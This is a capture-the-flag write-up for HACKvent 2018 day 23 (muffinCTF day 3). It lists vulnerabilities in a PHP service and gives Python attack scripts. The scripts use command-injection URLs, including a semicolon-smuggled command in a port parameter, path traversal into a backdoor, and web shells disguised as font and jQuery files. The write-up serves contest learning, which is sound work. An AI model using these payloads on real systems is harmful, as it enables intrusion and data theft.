# Day 23: MuffinCTF

*Day 3*

```
DAY 3 Services
--------------------------------------------
        .
       /:\
       |:|
       |:|
       |:|
       |:|      __
     ,_|:|_,   /  )                     *_   _   _   _   _   _   _   *
       (Oo    / _I_                     | `_' `-' `_' `-' `_' `-' `_'|
        +\ \  || __|            ^       |                            |       ^
           \ \||___|            |       |                            |       |
             \ /.:.\-\          |  (*)  |_   _   _   _   _   _   _   |  \^/  |
              |.:. /-----\      | _<">_ | `_' `-' `_' `-' `_' `-' `_'| _(#)_ |
              |___|  oOo  |    o+o \a/ \0                            0/ \a/ (=)
              /   ||     0'\a-a/\/                            \/\a-a/`0
             |_____\  :  /        /_^_\ |                            | /_^_\
              | |  \ \:/          || || |                            | || ||
              | |   | |           d|_|b_T____________________________T_d|_|b
              \ /   | \___              /                           /
              / |   \_____\         /                              /
              `-'               /                                 /
     ________________________/                                   /___________

    Name: barracks
    Description:
        The knights and warriors of the king are here practicing the art of war.
        These guys are no joke, be respectful when you talk with them.
        Other nations sent their assassins to poision our warriors, make sure that we thighten our security.
        Also maybe talk with these guys and to show the enemies our powerful warriors.
    Creator: xorkiwi

                              .- ._          *
                     .       (   ) `) ._,--.
              _.-.          (      .' |    }      ._    +
            .'     )         `(_'-'   |--'"        ))        |
           (   _.   )                 |           '"       - * -
          .-.-'  )  _)  .        ["I"I"I"I"}   .             .
         (  `   .)`'              I_I_I_I_I
          `-. (   )          [UUUUI_I_I_I_I
             `-..'            |[__I_I_[#]_I .        .
                       +      |__[I_I_I=I_I
             .       ._    +  |]_ I_[#]-I_I    ._          ;
                     |~       |_[ I_I=I_I_[,   |~
                   uuuuu      |__ I_I_I%I_I  uuuuu
                   | #_|      |[ _$_I_I%%_I  | _ |
                   |-  [      | [ %%I_g%%_I  |  -|         __a:f
              ---..|_  |.--,,'|]_ %_Ia%%I_I -|_- |.------""
                   |_-#|  ((  |_[ $%I%%_!^!  | _ |      +
                   |   |   )) |[_ |%.%I_|"|  |_  |    n Am   n
                 .-[_A_]_ '/  |_ / _Y_)_|`| -[N__]_        n
             ._.'        `- _.--'`'  ' "|\=\ ''    `-.
                          .'             |\=\`-._     `
                       .-'                  `:.  `---....__
                                               `
    Name: keep
    Description:
        This is the place where the king goes in difficult times.
        In your last audience it was clear, that the situation is critical.
        Defend the keep, the enemy troops are pushing more and more.
        And make sure that they pay for this.
    Creator: xorkiwi
```

Login to: [muffinCTF](http://whale.hacking-lab.com:9280/)

### Description

To get the HACKvent day 23 (muffinCTF day 3), you had to achieve the following requirements, in at least 2 of the last 5 ticks (1 tick = 3 minutes).

Have [barracks](files/barracks.zip) or/and [keep](files/keep.zip) service running with the following stats:
 - attack points > 20
 - maximal defense points
 - maximal availability points
 
Here is a copy of the [official instructions](INSTRUCTIONS.md).

### Solution

Again I focused solely on one of the services. This time it was the keep written in PHP. Here is what I found.

##### Keep

- Arbitrary command execution in `/home/keep/inc/userinfo.php`
- Path traversal vulnerability in `/home/keep/inc/inc.php`
- Arbitrary PHP page upload in `/home/keep/inc/ser.php`
- PHP object injection in `/home/keep/inc/dinner.php`
- Arbitrary code execution in `/home/keep/inc/login.php`

In addition to that there was still the backdoor outside the service stored in `/var/www/html/index.php` which could be exploited in combination with the path traversal vulnerability in the service itself.

After patching my keep and fixing a permissions problem I chose few of those easily exploitable vulnerabilities and wrote this attack script.

```python
def keep_exploit(attack_url):
    output = ''

    # grep -hra muffinCTF /home/keep/invitation
    output += get_flags(attack_url + 'inc/userinfo.php?a=grep+-hra+muffinCTF+/home/keep/invitation')
    output += get_flags(attack_url + 'inc/inc.php?page=../../../var/www/html/index.php&c=grep+-hra+muffinCTF+/home/keep/invitation')

    return output

muffin_ctf.attack_all('keep', keep_exploit)
```

To increase my chances I also used my proven port service exploits to steal flags from keep.

```python
def port_exploit(attack_url):
    output = ''

    # grep -hra muffinCTF /home/keep/invitation
    output += get_flags(attack_url + 'searchPortname.jsp?port=google.com%3Bgrep+-hra+muffinCTF+/home/keep/invitation')
    output += get_flags(attack_url + 'css/themes/default/assets/fonts/icons.svg.jsp?cmd=grep+-hra+muffinCTF+/home/keep/invitation')
    output += get_flags(attack_url + 'js/Framework/jquery.min/javascript/plugins/lib/jquery.min.js.jsp?cmd=grep+-hra+muffinCTF+/home/keep/invitation')

    return output
    
muffin_ctf.attack_all('port', port_exploit)
```

Complete source code of my exploit can be found [here](../../src/main/python/hackvent2018/Day23.py).

This is the flag I got.

```
HV18{muffinCTF{d4y_3_t3h_1337_b001s_g3t_4ll_d3m_gr0up13z_4nd_b0x3n}}
```
